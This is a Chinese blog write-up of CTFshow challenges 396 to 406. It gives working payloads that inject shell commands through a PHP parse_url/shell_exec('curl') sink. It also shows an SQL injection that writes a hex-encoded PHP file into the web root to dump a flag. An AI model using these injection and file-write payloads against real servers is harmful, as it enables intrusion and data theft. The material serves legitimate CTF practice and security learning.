---
title: CTFshow其他
abbrlink: 6352d546
date: 2022-06-03 20:09:59
tags:
---

**396**

`parse_url`函数将一个url拆分为如下形式

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628090124739.png)

无需绕过，直接构造

```
payload:?url=http://l/l;cat fl0g* >1.txt
```

**397**

加了个/tmp也没啥卵用，同上即可

**398**

在host处加了/;过滤，也没啥用

**399**

为啥跟host过不去啊，多滤了个>

**400**

过滤http也没用

**401**

同上

**402**

在scheme处过滤http，换个协议就行

**403**

```
if(preg_match('/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)$/', $url['host'])){ 
        shell_exec('curl '.$url['scheme'].$url['host'].$url['path']); 
    } 
```

这里匹配了一个ip地址，上面payload改一下就行

**405**

```php
if(preg_match('/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)./', $url['host'])){
	if(preg_match('/^\/[A-Za-z0-9]+$/', $url['path'])){
		if(preg_match('/\~|\.|php/', $url['scheme'])){
			shell_exec('curl '.$url['scheme'].$url['host'].$url['path']);
			}
		}
}
```

第一个在host中匹配IP地址，第二个path不能有字母数字，第三个协议中需要有php

最终payload如下

```
payload:?url=php://127.0.0.1;cat fl0g.php> 1.txt;11/a
```

**406**

`filter_var`函数[缺陷](https://www.cnblogs.com/lxfweb/p/13757525.html)

这里过滤器在验证url的合法性

```
?url=0://www.baidu.com;'union/**/select/**/1,0x3c3f70687020726571756972652027636f6e6669672e706870273b2473716c203d2773656c65637420666c61672066726f6d20666c616720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f312e74787422273b24726573756c74203d2024636f6e6e2d3e7175657279282473716c293b7661725f64756d702824726573756c74293b203f3e/**/into/**/outfile/**/"/var/www/html/4.php"%23
```

访问4.php后访问1.txt即可
